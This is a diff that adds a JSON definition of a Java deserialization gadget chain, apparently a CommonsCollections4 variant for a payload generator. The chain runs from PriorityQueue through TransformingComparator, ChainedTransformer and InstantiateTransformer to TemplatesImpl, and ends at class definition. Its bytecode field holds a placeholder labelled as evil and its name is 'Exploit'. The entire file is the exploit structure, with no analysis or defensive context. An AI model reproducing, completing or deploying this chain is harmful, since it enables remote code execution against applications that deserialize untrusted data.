@@ -1,0 +1,47 @@
+{
+  "chain_type": "CommonsCollections4 variant — ChainedTransformer with InstantiateTransformer sink (CC 4.x)",
+  "root_class": "java.util.PriorityQueue",
+  "root_trigger": "readObject→heapify→siftDown→comparator.compare",
+  "links": [
+    {
+      "class": "org.apache.commons.collections4.comparators.TransformingComparator",
+      "field_overrides": {
+        "transformer": {"$ref": "link:1"},
+        "decorated": null
+      }
+    },
+    {
+      "class": "org.apache.commons.collections4.functors.ChainedTransformer",
+      "field_overrides": {
+        "iTransformers": [
+          {"$ref": "link:2"},
+          {"$ref": "link:3"}
+        ]
+      }
+    },
+    {
+      "class": "org.apache.commons.collections4.functors.ConstantTransformer",
+      "field_overrides": {
+        "iConstant": "com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter"
+      }
+    },
+    {
+      "class": "org.apache.commons.collections4.functors.InstantiateTransformer",
+      "field_overrides": {
+        "iParamTypes": ["javax.xml.transform.Templates"],
+        "iArgs": [
+          {
+            "class": "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
+            "field_overrides": {
+              "_bytecodes": ["EVIL_BYTECODE_PLACEHOLDER"],
+              "_name": "Exploit",
+              "_tfactory": {},
+              "_outputProperties": null
+            }
+          }
+        ]
+      }
+    }
+  ],
+  "sink_method": "InstantiateTransformer→TrAXFilter(Templates)→TemplatesImpl.newTransformer→defineClass"
+}
